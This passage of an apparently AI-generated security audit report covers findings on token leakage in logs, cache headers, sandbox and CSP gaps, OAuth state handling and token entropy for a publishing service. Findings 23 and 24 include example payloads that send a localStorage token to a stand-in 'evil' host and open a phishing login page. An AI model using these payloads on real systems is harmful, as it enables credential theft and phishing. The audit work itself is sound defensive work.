*Severity: Low · `mcp-worker/wrangler.jsonc`:45 · surface: mcp-connector*

**What:** The ChatGPT connector authenticates with the workspace id as a bearer secret carried in the URL path (`/w_XXXX/mcp`, index.ts:46; dashboard `/w/w_XXXX`). wrangler.jsonc enables `observability: { enabled: true }`, and Cloudflare Workers Logs capture the full request URL — so every ChatGPT connector call writes the live bearer token into logs readable by anyone with Cloudflare account/dashboard access. The same id also lands in browser history and, for the `/w/w_XXXX` dashboard page, could leak via the Referer header if the page ever loads or links to a cross-origin resource. Because the id is simultaneously the publish bearer AND (per finding #1) opens the dashboard, a single log line is full workspace compromise.

**Exploit:** An operator, support engineer, or anyone with read access to Cloudflare Workers Logs for mcp.ilolink.com sees `GET /w_ABCD1234efgh5678/mcp ...` and now holds a token that can publish/unpublish/update documents and (via the bare-id dashboard bypass) read all analytics for that workspace. No further credentials needed.

**Fix:** Prefer the Authorization header over the path for the token where the client allows it. If the path token is unavoidable for ChatGPT, scrub the `w_...` segment from logged URLs (or disable URL logging for these routes), set a strict `Referrer-Policy: no-referrer` on the `/w/[token]` dashboard response, and document that connector/dashboard URLs are password-equivalent. Rotating tokens (app/api/connect/rotate) mitigates after a known leak but not silent log exposure.

### Info

#### 22. Token-bearing dashboard and admin pages have no explicit Cache-Control: no-store
*Severity: Info · `app/(app)/w/[token]/page.tsx`:11 · surface: secrets-headers-config*

**What:** The doc page (index.ts:1114), /raw (index.ts:1033), /api/doc-html, /api/stats, /api/heatmap, /api/documents, /api/feedback, /api/counts all set `cache-control: private, no-store` explicitly. The private, token/secret-bearing App Router pages — `/w/<token>` (page.tsx) and `/admin/moderation?key=<ADMIN_SECRET>` — do not; they rely solely on `export const dynamic = 'force-dynamic'` to avoid caching. That prevents Next's static/full-route cache but does not guarantee a `Cache-Control: no-store` response header for downstream shared caches, so the guarantee is framework-implementation-dependent rather than explicit on the exact responses that carry a bearer token / admin secret in the URL and render another party's private document list.

**Exploit:** If any shared cache (a corporate proxy, or a future Cloudflare cache rule) keys on the full URL, a private workspace dashboard body could be retained. Cross-user leakage is unlikely because the token is in the path, but the private content should still never be storable.

**Fix:** Set an explicit `Cache-Control: private, no-store` on these responses (e.g. via the app-wide `headers()`/middleware recommended above, matched to `/w/:token` and `/admin/:path*`), mirroring what the API routes and content worker already do rather than depending on force-dynamic.

#### 23. doc-html response CSP is inert for the heatmap preview (srcDoc), so app-origin safety of trusted (raw) docs rests solely on the omitted allow-scripts token
*Severity: Info · `app/api/doc-html/route.ts`:20 · surface: xss-sanitize-csp*

**What:** For trusted docs the publish pipeline stores the RAW UNSANITIZED HTML in rendered_r2_key (app/api/publish/route.ts:311-316 via renderTrusted → html === input.content), and /api/doc-html returns exactly that key's bytes. HeatmapView (app/(app)/dashboard/heatmap-view.tsx:220-229) renders it on the ilolink.com dashboard origin via `srcDoc={doc.data}` with `sandbox="allow-same-origin"` and NO allow-scripts. This is currently safe — without allow-scripts the raw doc's <script>/on* cannot run. BUT the DOC_CSP header (script-src 'none', etc.) that route.ts and the file comments present as a defense layer does NOT apply to the preview at all: srcDoc documents are constructed from a string and inherit the PARENT page's CSP, never the fetched response's headers (the code does fetch().text() then sets srcDoc). So the only thing standing between an attacker's trusted-doc script and same-origin XSS on the manage-token-bearing dashboard is the single absent `allow-scripts` token — the layered 'sandboxed AND script-free CSP' defense claimed in the comments is really one layer.

**Exploit:** Not exploitable as written. It becomes a full app-origin stored XSS (manage-token / dashboard compromise) the moment anyone adds allow-scripts to that iframe (e.g. to make previews interactive) or renders doc.data any other way, because the fetched CSP that authors believe protects them is a no-op for srcDoc. A trusted doc body such as `<img src=x onerror=fetch('https://evil/'+localStorage.token)>` would then run same-origin on ilolink.com.

**Fix:** Either serve the preview via `src="/api/doc-html?..."` (so the response CSP + sandbox both apply) instead of srcDoc, or add `sandbox` WITHOUT allow-scripts AND re-sanitize/neutralize before srcDoc, and correct the code comments so the missing allow-scripts is recognized as the sole guard. Add a regression test asserting the preview iframe never carries allow-scripts.

#### 24. Trusted-doc sandbox includes allow-popups-to-escape-sandbox, permitting un-sandboxed phishing popups
*Severity: Info · `content-worker/src/index.ts`:269 · surface: xss-sanitize-csp*

**What:** trustedFrame() wraps opt-in raw HTML in an iframe with sandbox="allow-scripts allow-forms allow-popups allow-popups-to-escape-sandbox allow-modals allow-downloads". The containment design is otherwise correct and I verified it: allow-same-origin is absent (opaque origin — the frame cannot read view.ilolink.com cookies/storage or reach parent/other docs), and allow-top-navigation is absent (cannot redirect the shared reader-shell page). However `allow-popups-to-escape-sandbox` means popups the doc opens are NOT sandboxed, and combined with allow-modals this gives an author-vouched page primitives for convincing full-window phishing (e.g. window.open() of a fake login on user activation, plus prompt()/alert() dialogs branded as view.ilolink.com).

**Exploit:** A trusted (publisher opt-in) doc runs `<script>document.body.onclick=()=>window.open('https://evil.example/login','_blank')</script>`. The opened window escapes the sandbox entirely (full scripting, own origin) and can render a pixel-perfect credential page; the ilolink URL bar/reader chrome lends it legitimacy. Trusted status is publisher-controlled and only gated by Turnstile + IP rate limit (app/api/publish/route.ts), not by any vetting.

**Fix:** Drop allow-popups-to-escape-sandbox (and reconsider allow-popups/allow-modals) unless a concrete author use-case needs escaping popups; escaped popups defeat the purpose of sandboxing the content. If popups are needed, keep them sandboxed (allow-popups without ...-to-escape-sandbox).

#### 25. Password-unlock cookie token is a bare SHA-256(slug:password_hash) with no server-side key — security rests entirely on password_hash never leaking
*Severity: Info · `content-worker/src/index.ts`:137 · surface: auth-tokens*

**What:** The per-doc unlock cookie value is unlockToken(slug, password_hash) = hex(SHA-256(`${slug}:${password_hash}`)) (content-worker/src/index.ts:137-144), verified with a constant-time compare (correct). There is no server secret mixed in, so the token is a pure deterministic function of the slug and the stored password_hash. The verification and cookie flags (HttpOnly, Secure, SameSite=Lax, 6h max-age) are fine, and password_hash is not currently served to clients, so this is not exploitable today. It is a hardening note: the unlock capability is only as secret as password_hash, and any future path that exposes password_hash (a debug endpoint, an admin export, a restore/response leak) would immediately make unlock cookies forgeable and valid for 6 hours across the whole slug.

**Exploit:** Not exploitable as written (password_hash is never returned to clients). Latent risk: if password_hash ever leaks, an attacker computes hex(SHA-256(slug:password_hash)) offline, sets cookie ilo_unlock_<slug>, and bypasses the password gate for that document without knowing the password.

**Fix:** Derive the unlock token with an HMAC keyed by a Worker secret (the content-worker already reads SALT_SECRET): token = HMAC-SHA256(SALT_SECRET, `${slug}:${password_hash}`). Then even a password_hash leak cannot forge unlock cookies without also compromising the Worker secret.

#### 26. Open Graph description embeds a plaintext excerpt of unlisted document content
*Severity: Info · `content-worker/src/index.ts`:325 · surface: privacy-pii-data*

**What:** readerShell always builds og:/twitter:description from descriptionFromBody(textForMeta) — a ~180-char plaintext excerpt of the rendered document — and sets it for unlisted docs too (unlisted only adds <meta name=robots noindex>). Password-protected docs are NOT affected because the gate returns before readerShell runs, so this is not a password bypass; it is limited to the unlisted tier. Marking as info because an unlisted URL already yields the full body to whoever holds it, so the OG excerpt discloses nothing the URL-holder can't already fetch.

**Exploit:** If an unlisted URL is pasted into a chat/social/link-unfurling service, that third party's crawler fetches the page and its unfurler stores/relays the content excerpt (and the /api/og card title) — spreading a snippet of intended-private content to systems beyond the recipient. It does not create access the URL-holder lacked, but it widens where the excerpt lands.

**Fix:** For unlisted (and expiring) visibility, suppress the content-derived og/twitter description and use a generic string, and consider omitting the per-doc og:image title, so link unfurlers don't cache private excerpts. This is a hardening nicety, not a confidentiality boundary.

#### 27. Admin key constant-time compare returns early on length mismatch (minor length oracle)
*Severity: Info · `lib/admin/gate.ts`:12 · surface: idor-multitenancy*

**What:** constantTimeEqual() returns immediately when a.length !== b.length before the XOR loop. This leaks the length of ADMIN_SECRET via a timing/branch difference. Impact is negligible — the secret is high-entropy and this only reveals its length — so this is a hardening note, not an exploitable finding.

**Exploit:** An attacker measuring response timing across many requests could in principle distinguish 'wrong length' from 'right length, wrong bytes'. In practice ADMIN_SECRET length is not sensitive and network jitter dominates, so this is not practically exploitable.

**Fix:** Optional: compare against a fixed-size digest (e.g. HMAC/SHA-256 both inputs to a constant length, then constant-time compare) so no branch depends on the raw secret length. Low priority.

#### 28. OAuth consent POST reconstructs the AuthRequest from unauthenticated client-supplied state and has no CSRF token
*Severity: Info · `mcp-worker/src/authorize.ts`:91 · surface: auth-tokens*

**What:** On approve, authorizeHandler parses the AuthRequest from a base64 'state' hidden form field with no integrity protection (mcp-worker/src/authorize.ts:87-105) and there is no CSRF token on the consent form. state is fully attacker-controllable, and parsed.scope is forwarded straight into completeAuthorization (line 102). I verified the underlying library (@cloudflare/workers-oauth-provider, oauth-provider.js:2996-3000) re-derives clientInfo from clientId and re-validates redirectUri against the client's REGISTERED redirect URIs inside completeAuthorization, and the handler sets props/userId server-side (not from state) — so redirect_uri tampering and props injection are NOT possible, and each grant mints a fresh anonymous workspace, so there is no pre-existing identity to hijack. Impact is therefore limited to an attacker choosing scope/clientId for a throwaway workspace they control. Flagging for defense-in-depth only.

**Exploit:** No privilege escalation available: the library rejects any redirect_uri not registered to the clientId in the state, and every authorize creates a brand-new empty workspace. A crafted state can only alter the scope granted to the attacker's own fresh workspace, or a login-CSRF could bind a victim's browser to an attacker-registered client's throwaway workspace (no data exposure).

**Fix:** Sign or HMAC the state blob (or store the parsed AuthRequest server-side keyed by a random state id) so the POST cannot be reconstructed from arbitrary client input, and add a CSRF token to the consent form. Validate parsed.scope against scopesSupported before forwarding.

#### 29. Prompt-injection posture: document contents are never treated as server-side instructions (verified clean)
*Severity: Info · `mcp-worker/src/publish-core.ts`:222 · surface: mcp-connector*

**What:** Verified the requested prompt-injection concern. Document content supplied to publish_document/update_document is only ever sanitized/rendered (lib/publish/formats.renderContent), stored to R2/D1/KV, and passed to the abuse scanner (scanContent) — it is never eval'd, never used to build a query string, and never branched on as control instructions by the worker. Tool descriptions are static string literals in agent.ts. The read tools (search/list_documents/fetch) echo attacker-controllable titles back to the calling model, but strictly scoped to the caller's own workspace (docs.ts queries all filter by workspace_id), so there is no cross-tenant injected-instruction delivery. Output sizes are bounded (list ≤100, search ≤25, fetch never returns the raw body — agent.ts:299).

**Exploit:** No server-side injection path found. The only residual, low vector is a user publishing a doc whose title contains model-directed text and then reading it back via search/fetch in the same workspace — i.e. self-injection, no privilege gain.

**Fix:** No change required for the server. If desired, downstream MCP clients should continue to treat tool-returned titles/text as untrusted data, not instructions.

#### 30. Workspace bearer-token entropy (w_ + nanoid(16)) is adequate — confirmation, no action needed
*Severity: Info · `mcp-worker/src/workspace.ts`:10 · surface: auth-tokens*

**What:** The task asked whether w_ + nanoid(16) is sufficient as a bearer secret. mintWorkspaceId (mcp-worker/src/workspace.ts:10-16) uses a 62-character alphabet at length 16 = ~95.3 bits of entropy from crypto-quality randomness, and the same generator is used in app/api/connect/route.ts and rotate. The per-doc manage token is nanoid(32) (~190 bits, lib/manage-token.ts) and is SHA-256 hashed at rest with a length-checked constant-time compare (lib/manage-token.ts:21-33) — correct. PBKDF2 password hashing is 600k iterations SHA-256 with per-hash random salt and constant-time compare (lib/crypto/password.ts) — correct. The dashboard HMAC verify itself does the length check + constant-time compare correctly (lib/mcp/dashboard-token.ts:50-53); the only defect there is accepting unsigned tokens, reported separately.

**Exploit:** None. ~95 bits is far beyond brute-force reach for a bearer token that is also rate-limited at the DB lookup. Recorded as a positive verification of the crypto/entropy review scope.

**Fix:** No change required. If desired for extra margin, the bare ChatGPT token could be lengthened, but 95 bits is comfortably sufficient.

#### 31. mcp-worker omits the global_fetch_strictly_public compatibility flag used by the other two workers
*Severity: Info · `mcp-worker/wrangler.jsonc`:10 · surface: secrets-headers-config*

**What:** The app and content workers both set `compatibility_flags: ["nodejs_compat", "global_fetch_strictly_public"]`, which blocks Worker fetch() from reaching internal/private addresses and from looping back to origins on the same zone. The mcp-worker sets only `["nodejs_compat"]`. I reviewed mcp-worker/src and its MCP tools (publish/list/update/get_analytics/search/fetch/get_dashboard_url) do not currently take a user-controlled URL and call fetch() on it, so there is no active SSRF today. This is an inconsistency/hardening gap rather than a live vulnerability: if a future tool ever fetches a user-supplied URL, the missing flag removes a guardrail.

**Exploit:** No current exploit. Latent: a later change adding URL fetching to an MCP tool would be exposed to SSRF against Cloudflare-internal/metadata endpoints without the flag that the sibling workers already enforce.

**Fix:** Add `global_fetch_strictly_public` to mcp-worker/wrangler.jsonc compatibility_flags for parity and defense-in-depth.

#### 32. Cloudflare account_id committed in wrangler.jsonc files
*Severity: Info · `wrangler.jsonc`:8 · surface: secrets-headers-config*

**What:** `account_id` (a8ec57aa9f4b6a49e48e60b1aa2a306e) is hardcoded in all three wrangler.jsonc files (and also in .env-adjacent .cf.env). A Cloudflare account ID is not a secret by itself — it is not sufficient to authenticate — so this is not a vulnerability. Noting it only because it reduces attacker recon effort and, combined with a leaked API token, identifies the exact target account. Separately, .env.production is committed but correctly contains only NEXT_PUBLIC_TURNSTILE_SITEKEY, which is public by design — that is fine.

**Exploit:** No direct exploit; account_id alone grants nothing.

**Fix:** No action required for security. Optionally source account_id from `CLOUDFLARE_ACCOUNT_ID` env at deploy time to keep it out of the tree, but this is cosmetic.

---

## Supplementary checks

**Secrets / config:**
- `.cf.env` (live Cloudflare API token) is git-ignored and NOT committed. ✓ But it sits in a cloud-synced project folder — see MEDIUM finding; **rotate the token**.
- `.env.production` IS committed but contains only the **public** Turnstile site key (`0x4AAA…`) — no secret. The real prod key is set, so the always-pass test key is NOT active in production. ✓
- No hardcoded secrets/API keys/private keys found in tracked source. ✓
- Cloudflare `account_id` is committed in `wrangler.jsonc` (not a secret, but identifies the account — INFO).

**Dependencies (`npm audit`):** 7 advisories (3 high, 4 moderate), all transitive and effectively **not reachable on the Cloudflare/workerd runtime**:
- `sharp` (high, libvips CVEs) — pulled by Next image optimization; not executed on Workers.
- Hono `serve-static` path traversal (moderate) — **Windows-only** (`%5C`); ilolink runs on Linux/workerd.
- `@modelcontextprotocol/sdk` advisory targets an older range than the pinned `1.29.0`.
- Action: schedule `npm audit fix` / dependency bumps, but none are launch-blocking.

**Security headers (live):** the isolated content origin sets a strict per-doc CSP + nosniff; the **app origin sends none** (see MEDIUM finding).

---

## What is solid (verified good)
- **Sanitization / XSS:** strict `sanitize-html` allowlist, all widget/tracker user text via `textContent` (no innerHTML), JSON/CSV/image render paths escaped and re-sanitized. Untrusted docs served from an isolated origin under `default-src 'none'` + nonce'd scripts.
- **Trusted (raw) HTML:** contained in a `sandbox="allow-scripts"` opaque-origin iframe (no `allow-same-origin`) — cannot touch cookies/other docs on the shared origin. Confused-deputy avoided.
- **SQL:** every query is parameterized (`.bind(?)`); no string interpolation into SQL found across all three workers.
- **Cross-request isolation:** `ctx.props` is per-request; no leak between MCP sessions.
- **Prompt injection:** document contents are treated as data, never as server-side instructions.
- **Crypto:** workspace/token entropy adequate; OAuth PKCE (S256) + redirect_uri validation enforced by the library; constant-time compares on unlock tokens.

## False positives (raised, then refuted on verification)
- "Dashboard HMAC is bypassable" — the bare-workspace-id branch is **by design** for the ChatGPT path (the id IS the bearer secret); the OAuth path is signed. Documented as LOW, not a break.
- A few duplicate reports of the same issue across auditors were merged.

*Generated 2026-07-23 from a multi-agent audit (45 agents, 34 confirmed findings after verification). Re-run before major releases.*
